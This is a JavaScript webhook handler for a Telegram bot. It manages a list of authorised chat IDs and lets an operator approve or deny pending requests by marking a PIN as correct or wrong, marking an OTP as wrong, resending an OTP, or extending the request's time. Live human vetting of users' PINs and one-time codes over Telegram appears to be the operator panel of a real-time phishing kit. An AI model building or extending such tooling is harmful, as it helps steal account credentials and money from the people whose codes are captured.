const { sendMessage, editMessageText, answerCallbackQuery } = require('../lib/telegram');
const { addUser, removeUser, listUsers, isUser } = require('../lib/store');
const { get: getApproval, save: saveApproval, extend: extendApproval } = require('../lib/approvals');

const CHAT_ID = /^\/(?:add|remove)(?:@\w+)?\s+#?(-?\d{3,20})$/;

function buildAdminMenu() {
  return {
    inline_keyboard: [
      [{ text: '➕ Add User', callback_data: 'admin:add' }],
      [{ text: '➖ Remove User', callback_data: 'admin:remove' }],
      [{ text: '📋 List Users', callback_data: 'admin:list' }],
    ],
  };
}

async function handleCallback(update, token, adminId) {
  const cq = update.callback_query;
  if (!cq || !cq.data) return;

  const senderId = String(cq.from.id);
  const allowed = senderId === adminId || (await isUser(senderId).catch(() => false));

  if (!allowed) {
    await answerCallbackQuery(token, cq.id).catch(() => null);
    return;
  }

  // Approval callbacks
  const approvalMatch = /^a:([a-f0-9]{10}):(\w+)$/.exec(cq.data);
  if (approvalMatch) {
    return handleApprovalCallback(cq, approvalMatch, token, adminId);
  }

  // Admin menu callbacks
  if (cq.data.startsWith('admin:')) {
    return handleAdminCallback(cq, cq.data.split(':')[1], token, senderId);
  }

  await answerCallbackQuery(token, cq.id).catch(() => null);
}

async function handleApprovalCallback(cq, m, token, adminId) {
  const [, approvalId, action] = m;
  const rec = await getApproval(approvalId).catch(() => null);

  if (!rec) {
    await answerCallbackQuery(token, cq.id, 'Request expired').catch(() => null);
    return;
  }

  if (rec.status !== 'pending') {
    await answerCallbackQuery(token, cq.id, 'Already handled').catch(() => null);
    return;
  }

  const actionMap = {
    pinok: { status: 'approved', action: 'pin_ok', note: '✅ APPROVED - User can proceed', final: true },
    bothok: { status: 'approved', action: 'both_ok', note: '✅ APPROVED - User can proceed', final: true },
    pinbad: { status: 'denied', action: 'pin_bad', note: '❌ WRONG PIN', final: true },
    otpbad: { status: 'denied', action: 'otp_bad', note: '❌ WRONG CODE - Please resend OTP', final: true },
    resend: { status: 'pending', action: 'resend_otp', note: '📨 OTP resent', final: false },
    extend: { status: 'pending', action: 'extended', note: '', extend: true },
  };

  const act = actionMap[action];
  if (!act) {
    await answerCallbackQuery(token, cq.id).catch(() => null);
    return;
  }

  rec.status = act.status;
  rec.action = act.action;

  const toastMap = {
    pinok: 'PIN verified',
    bothok: 'PIN & OTP verified',
    pinbad: 'PIN incorrect',
    otpbad: 'OTP incorrect',
    resend: 'OTP resent',
    extend: 'Extended by 5 minutes',
  };

  try {
    if (act.extend) {
      const newExpiry = extendApproval(rec, 5 * 60 * 1000);
      const hm = new Date(newExpiry).toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', hour12: false });
      act.note = `⏱ Time extended to ${hm}`;
    }

    await saveApproval(rec);

    if (cq.message && cq.message.chat) {
      const editOpts = {};
      let editText = `<b>Actions:</b>\n\n${act.note}`;

      if (act.final) {
        editOpts.reply_markup = { inline_keyboard: [] };
      }

      await editMessageText(token, cq.message.chat.id, cq.message.message_id, editText, {
        parse_mode: 'HTML',
        ...editOpts,
      }).catch(() => null);
    }

    await answerCallbackQuery(token, cq.id, toastMap[action] || 'Done').catch(() => null);
  } catch (err) {
    console.error('Callback handling error:', err);
    await answerCallbackQuery(token, cq.id, 'Error').catch(() => null);
  }
}

async function handleAdminCallback(cq, action, token, senderId) {
  try {
    if (action === 'list') {
      const users = await listUsers().catch(() => null);
      let text = '';
      let keyboard = { inline_keyboard: [] };

      if (users === null) {
        text = '❌ Storage unavailable';
      } else if (users.length === 0) {
        text = '📭 No users yet';
      } else {
        text = `<b>Users (${users.length}):</b>\n\n`;
        users.forEach((u) => {
          text += `• <code>${u}</code>\n`;
        });
        keyboard.inline_keyboard = users.map((u) => [
          { text: `❌ Remove ${u}`, callback_data: `admin:confirm_remove:${u}` },
        ]);
      }

      if (cq.message) {
        await editMessageText(token, cq.message.chat.id, cq.message.message_id, text, {
          parse_mode: 'HTML',
          reply_markup: keyboard,
        }).catch(() => null);
      } else {
        await sendMessage(token, senderId, text, {
          parse_mode: 'HTML',
          reply_markup: keyboard,
        }).catch(() => null);
      }
      await answerCallbackQuery(token, cq.id).catch(() => null);
    } else if (action.startsWith('confirm_remove:')) {
      const userId = action.split(':')[2];
      const removed = await removeUser(userId).catch(() => null);
      const msg = removed ? `✅ Removed: ${userId}` : `❌ Failed to remove ${userId}`;
      await answerCallbackQuery(token, cq.id, msg).catch(() => null);

      if (cq.message) {
        const users = await listUsers().catch(() => []);
        const keyboard = { inline_keyboard: [] };
        let text = `<b>Users (${users.length}):</b>\n\n`;
        if (users.length === 0) {
          text = '📭 No users yet';
        } else {
          users.forEach((u) => {
            text += `• <code>${u}</code>\n`;
          });
          keyboard.inline_keyboard = users.map((u) => [{ text: `❌ Remove ${u}`, callback_data: `admin:confirm_remove:${u}` }]);
        }
        await editMessageText(token, cq.message.chat.id, cq.message.message_id, text, {
          parse_mode: 'HTML',
          reply_markup: keyboard,
        }).catch(() => null);
      }
    } else if (action === 'add' || action === 'remove') {
      const msg = action === 'add' ? 'Reply with chat ID to add (format: 123456789)' : 'Reply with chat ID to remove';
      await answerCallbackQuery(token, cq.id, msg).catch(() => null);

      if (cq.message) {
        await editMessageText(token, cq.message.chat.id, cq.message.message_id, `<b>Admin Menu</b>\n\n${msg}`, {
          parse_mode: 'HTML',
          reply_markup: buildAdminMenu(),
        }).catch(() => null);
      }
    }
  } catch (err) {
    console.error('Admin callback error:', err);
    await answerCallbackQuery(token, cq.id, 'Error').catch(() => null);
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).end();
  }

  const webhookSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
  if (webhookSecret && req.headers['x-telegram-bot-api-secret-token'] !== webhookSecret) {
    return res.status(401).end();
  }

  const update = req.body || {};
  const message = update.message || update.edited_message;
  const token = process.env.TELEGRAM_TOKEN;
  const adminId = String(process.env.SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '');

  if (update.callback_query && token && adminId) {
    await handleCallback(update, token, adminId);
    return res.status(200).json({ ok: true });
  }

  const replies = [];

  if (message && typeof message.text === 'string' && token && adminId) {
    const senderId = String(message.chat.id);
    const text = message.text.trim();

    if (senderId === adminId) {
      if (text.startsWith('/start')) {
        replies.push([
          senderId,
          '<b>Admin Menu</b>',
          {
            parse_mode: 'HTML',
            reply_markup: buildAdminMenu(),
          },
        ]);
      } else if (text === '/list' || /^\/list(?:@\w+)?$/.test(text)) {
        const users = await listUsers().catch(() => null);
        let content = '';
        let markup = null;

        if (users === null) {
          content = '❌ Storage unavailable';
        } else if (users.length === 0) {
          content = '📭 No users yet';
        } else {
          content = `<b>Users (${users.length}):</b>\n\n`;
          users.forEach((u) => {
            content += `• <code>${u}</code>\n`;
          });
          markup = {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: users.map((u) => [{ text: `❌ Remove ${u}`, callback_data: `admin:confirm_remove:${u}` }]),
            },
          };
        }

        replies.push([senderId, content, markup || { parse_mode: 'HTML' }]);
      } else {
        const match = CHAT_ID.exec(text);
        if (match && text.startsWith('/add')) {
          const added = await addUser(match[1]).catch(() => null);
          const content =
            added === null
              ? '❌ Storage unavailable'
              : added
                ? `✅ User added: ${match[1]}`
                : `ℹ️ Already added: ${match[1]}`;
          replies.push([senderId, content]);
        } else if (match && text.startsWith('/remove')) {
          const removed = await removeUser(match[1]).catch(() => null);
          const content =
            removed === null ? '❌ Storage unavailable' : removed ? `✅ User removed: ${match[1]}` : `❌ Not found: ${match[1]}`;
          replies.push([senderId, content]);
        } else if (text.startsWith('/')) {
          const help = '<b>Admin Commands:</b>\n\n' + '🔘 Use the menu buttons for quick actions\n\n' + 'Or use text commands:\n' + '/add #&lt;id&gt; - add user\n' + '/remove #&lt;id&gt; - remove user\n' + '/list - show users\n' + '/start - show menu';
          replies.push([senderId, help, { parse_mode: 'HTML' }]);
        }
      }
    } else if (await isUser(senderId).catch(() => false)) {
      if (/^\/start(?:@\w+)?$/.test(text)) {
        replies.push([senderId, 'Bot is working']);
      }
    }
  }

  await Promise.allSettled(
    replies.map(([chatId, text, markup]) =>
      markup ? sendMessage(token, chatId, text, markup) : sendMessage(token, chatId, text)
    )
  );
  return res.status(200).json({ ok: true, replies: replies.length });
};
